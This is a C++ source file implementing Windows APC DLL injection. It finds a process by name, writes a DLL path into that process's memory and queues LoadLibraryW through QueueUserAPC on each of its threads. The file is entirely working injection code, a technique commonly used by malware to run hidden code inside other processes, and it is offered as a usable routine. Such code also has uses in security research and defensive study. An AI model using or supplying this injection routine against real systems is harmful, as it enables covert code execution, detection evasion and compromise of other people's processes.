#include "apc_injection.h"


bool findProcessByName(PCWSTR exeName, DWORD& pid, std::vector<DWORD>& tids) 
{
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return false;
	}

	pid = 0;

	PROCESSENTRY32 pe = { sizeof(pe) };
	if (Process32First(hSnapshot, &pe)) 
	{
		do 
		{
			if (_wcsicmp(pe.szExeFile, exeName) == 0) 
			{
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (Thread32First(hSnapshot, &te)) 
				{
					do 
					{
						if (te.th32OwnerProcessID == pid) 
						{
							tids.push_back(te.th32ThreadID);
						}
					} while (Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} 
		while (Process32Next(hSnapshot, &pe));
	}

	CloseHandle(hSnapshot);
	return pid > 0 && !tids.empty();
}


bool injectDll(LPWSTR aTargetProc, LPWSTR aDllToInject)
{
	DWORD pid{};
	std::vector<DWORD> tids{};

	DEBUG_PRINT("[ ] finding matching process name");
	if (!findProcessByName(aTargetProc, pid, tids))
	{
		DEBUG_PRINT("[-] failed to find process");
		return FALSE;
	}
	DEBUG_PRINT("[+] found prcoess\n");
	DEBUG_PRINT("[ ] Opening Process");
	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
	{
		DEBUG_PRINT("[-] failed to open proceess");
		return FALSE;
	}
	DEBUG_PRINT("[+] Opened process\n");

	DEBUG_PRINT("[ ] allocating memory in process");
	auto pVa = VirtualAllocEx(hProcess,
		                      nullptr,
		                      1 << 12,
		                      MEM_COMMIT | MEM_RESERVE, 
		                      PAGE_READWRITE);

	DEBUG_PRINT("[+] allocated memory in remote process\n");
	DEBUG_PRINT("[ ] writing remote process memeory");
	SIZE_T bytesWritten = 0;
	if (!WriteProcessMemory(hProcess, pVa, aDllToInject, wcslen(aDllToInject) * 2, &bytesWritten))
	{
		DEBUG_PRINT("[-] failed to write remote process memory");
		return FALSE;
	}

	DEBUG_PRINT("[+] wrote remote process memory");
	DEBUG_PRINT("[ ] Enumerating APC threads in remote process");
	for (const auto &tid : tids) {
		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
		if (hThread) {
			DEBUG_PRINT("[*] found thread");
			auto retVal = QueueUserAPC((PAPCFUNC)GetProcAddress
			                           (GetModuleHandle(L"kernel32"),
					                    "LoadLibraryW"),
				                        hThread,
				                        (ULONG_PTR)pVa);
			if (retVal == 0)
			{
				DEBUG_PRINT("[-] QueueUserAPC failed");
			}
			
			CloseHandle(hThread);
		}
	}
	CloseHandle(hProcess);
	return TRUE;
}